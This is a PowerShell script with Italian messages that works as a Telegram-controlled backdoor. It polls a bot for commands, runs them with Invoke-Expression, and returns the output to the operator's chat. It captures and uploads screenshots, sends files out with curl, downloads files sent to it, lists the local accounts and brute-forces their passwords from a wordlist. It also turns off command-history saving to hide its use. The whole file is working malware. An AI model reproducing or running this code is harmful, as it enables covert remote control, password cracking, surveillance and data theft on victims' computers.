
Clear-Host

Set-PSReadlineOption -HistorySaveStyle SaveNothing
Set-Location -Path $env:USERPROFILE

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$telegram_id, $api_token  = "@1", "@2"
$api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
$api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
$api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
$api_download_file  = 'https://api.telegram.org/file/bot{0}/' -f $api_token
$api_upload_file    = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
$logs = $true
$Global:ProgressPreference = 'SilentlyContinue'


function Log($string)
{
    if ($logs) {
        Write-Host -ForegroundColor Yellow -BackgroundColor Black ("+ [" + (get-date).ToString() + "] " + $string)
        Start-Sleep -Milliseconds 50
    }
}


function CheckAdminRights
{
    Log "Controllo se lo script è in esecuzione come amministratore"
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) {
        return ("L'utente '$env:USERNAME' ha i privilegi di amministratore")
    } else {
        return ("L'utente '$env:USERNAME' non ha i privilegi di amministratore")
    }
}


function GetLocalAccounts
{
    SendMessage "Ricerca degli account validi in corso..."    
    SendMessage ("Account trovati: " + (Get-WmiObject Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true -and $_.Status -eq 'OK' }).Name -join ', ')
}


function CrackAccount ($account, $wordlist) 
{
    Log "Verifio l'esistenza della wordlist"
    if (Test-Path $wordlist) { $wordlist = Get-Content $wordlist; Log "Wordlist caricata in memoria" }
    else { Log "Wordlist inesistente"; SendMessage "Wordlist inesistente" }

    Log "Inizio operazione di BruteForce dell'account $utente"; SendMessage "Inizio operazione di BruteForce dell'account $utente"

    try {
        net use \\127.0.0.1 /d /y 2>&1 | Out-Null
        Log "Disconnection successful."
    } catch {
        Log "Disconnection failed."
    }
    
    $pass_found = $false

    foreach ($word in $wordlist) {
        try {
            $result = net use \\127.0.0.1 /user:$account $word 2>&1
            $exitCode = $LASTEXITCODE
    
            if ($exitCode -eq 0) {
                Log "Connection successful with password: $word"
                SendMessage "Password trovata [$account > $word]"
                net use \\127.0.0.1 /d /y 2>&1 | Out-Null
                $pass_found = $true
                break
            } else {
                Log "Connection failed with password: $word (Exit code: $exitCode)"
            }
        } catch { Log "Connection failed with password: $word" }
    }

    if (!($pass_found)) {
        SendMessage "Password non trovata"
    }
}

function GetScreenshot
{
    try {
        SendMessage "Procedo a catturare la schermata..."
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)
        $outputPath = Join-Path $env:APPDATA ("screen_"+$env:COMPUTERNAME+".png")
        $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        $graphics.Dispose()
        SendFile $outputPath
        Remove-Item $outputPath -Force
    }
    catch {
        SendMessage $Error[0]
    }
}


function DownloadFile($file_id, $file_name)
{
    Log "Procedo a recuperare le informazioni del file da scaricare"
    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
    $file_path      = $get_file_path.result.file_path

    Log "Scarico il file [$($file_name)] nella macchina"
    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session

    Log "Verifico che il file sia stato scaricato"
    if (Test-Path -Path $file_name) {
        SendMessage "File scaricato con successo"
    } else {
        SendMessage "Il file non è stato scaricato"
    }
}


function SendFile($filePath) 
{
    SendMessage "Procedo ad inviare il file [$($filePath)]"
    if (Test-Path -Path $filePath -PathType Leaf) {
        try {
            Log "Invio del file in corso"
            curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null
            Log "File inviato con successo"
        } catch {
            SendMessage "Errore durante l'upload del file: [$($Error[0])]"
        }
    } else {
        SendMessage "Il file indicato non è stato trovato"
    }
}


function SendMessage($output)
{
    Log "Procedo ad inviare il messaggio"

    # To escape _*``[\
    $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"

    $MessageToSend = @{
        chat_id    = $telegram_id
        parse_mode = "MarkdownV2"
        text       = "``````#$hostia`n$output`n``````"
    }

    $MessageToSend = $MessageToSend | ConvertTo-Json

    try {
        Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
        Log "Messaggio inviato con successo"
    } catch {
        Log "Il messaggio non è stato inviato: [$($Error[0])]"
        Start-Sleep -Seconds 3
    }
}


function CheckRequiredParameters($CommandString)
{
    # Dividi la stringa del comando in un array di parole
    $commandParts = $CommandString -split ' '

    # Il primo elemento è il nome del comando
    $commandName = $commandParts[0]

    # Verifica se il comando è un alias
    if ((Get-Command -Name $commandName).CommandType -eq "Alias") {
        # Recupera il comando associato all'alias
        $commandName = (Get-Alias -Name $commandName).Definition
    }

    # Verifica se è un cmdlet
    if ((Get-Command -Name $commandName).CommandType -eq 'Cmdlet') {
        # Ottengo i parametri obbligatori per il comando
        $requiredParameters = Get-Help -Name $commandName -Parameter * -ErrorAction SilentlyContinue | Where-Object { $_.Required -eq $true -and $_.Position -eq 0 } | Select-Object -ExpandProperty Name
        if ($requiredParameters.Count -eq 0) {
            return $true
        }

        # Restringo l'array agli argomenti (escludendo il nome del comando)
        $arguments = $commandParts[1..$($commandParts.Count - 1)]

        # Estraggo i nomi dei parametri dagli argomenti
        $parameterNames = $arguments -match '^[-/]([\w]+)[:=]?' | ForEach-Object { $_ -replace '^[-/]|[:=]$' }

        # Verifico se i parametri obbligatori sono presenti tra i nomi dei parametri
        $missingParameters = $requiredParameters | Where-Object { $_ -notin $parameterNames }

        if ($missingParameters.Count -gt 0) {
            SendMessage "Il comando '$commandName' richiede i seguenti parametri obbligatori mancanti: $($missingParameters -join ', ')"
            return $false
        } else {
            return $true
        }
    } else {
        return $true
    }
}


function CommandListener
{
    $offset = 0
    $hostia = $env:COMPUTERNAME
    $hostname = $hostia
    $wait = 1000

    try {
        Log "Invio un avviso al controller che il bot è stato avviato con successo"
        SendMessage "Computer online!"
    } catch {
        Exit-PSSession
    }

    while ($true) {        
        try {
            $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
            if (($message.result.Count -gt 0) -and ($message.result.Count -gt $offset)) {
                    if ($offset -eq 0) {
                        $offset = $message.result.Count
                        Start-Sleep -Seconds 1
                        continue
                    }

                    $offset     = $message.result.Count
                    $message    = $message.result.Message[-1]
                    $user_id    = $message.chat.id
                    $text       = $message.text
                    $document   = $message.document
                    
                    if ($text.Length -gt 0) {
                        $check_command = $text.Split()
                        if ($check_command[0] -match "SET") {
                            if ($check_command[1] -match "ALL") {
                                $hostname = $hostia
                                SendMessage "Computer pronto a ricevere istruzioni"
                            } else {
                                $hostname = $check_command[1]
                                if ($env:COMPUTERNAME -match $hostname) {
                                    SendMessage "Computer pronto a ricevere istruzioni"
                                }
                            }
                            continue
                        }
                        
                        if ($check_command[0] -match "ONLINE") {
                            SendMessage "Computer operativo"
                            continue
                        }
                    }
        
                    if ($hostname -match $hostia) {
                        if ($user_id -match $telegram_id) {
                            if ($text.Length -gt 0) {
                                try {
                                    if (CheckRequiredParameters $text) {
                                        $output = Invoke-Expression -Command $text | Out-String
                                    } else {
                                        continue
                                    }
                                } catch {
                                    $output = $Error[0] | Out-String
                                }
        
                                $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4096) {
                                    $output.Substring($i, [Math]::Min(4096, $output.Length - $i))
                                }                        
        
                                foreach ($block in $output_splitted) {
                                    $block = $block | Out-String
                                    SendMessage $block
                                }

                                if ($output_splitted.Count -eq 0) {
                                    Start-Sleep -Milliseconds 300
                                    SendMessage "Comando ricevuto/eseguito"
                                }
                            }

                            if ($document) {
                                $file_id   = $document.file_id
                                $file_name = $document.file_name
                                DownloadFile $file_id $file_name
                            }
                        } else {
                            $unauth_user_found = ("Unauthorized user found! " + $user_id)
                            SendMessage $unauth_user_found
                        }
                    }
                    $wait = 900
            }

            if ($wait -eq 3000) {
                $wait = 1000
            } else {
                $wait = $wait + 100
            }

            Start-Sleep -Milliseconds $wait
        } catch {
            Log $Error[0]
            Start-Sleep -Seconds 5
        }
    }
    $session.Dispose()
}


CommandListener
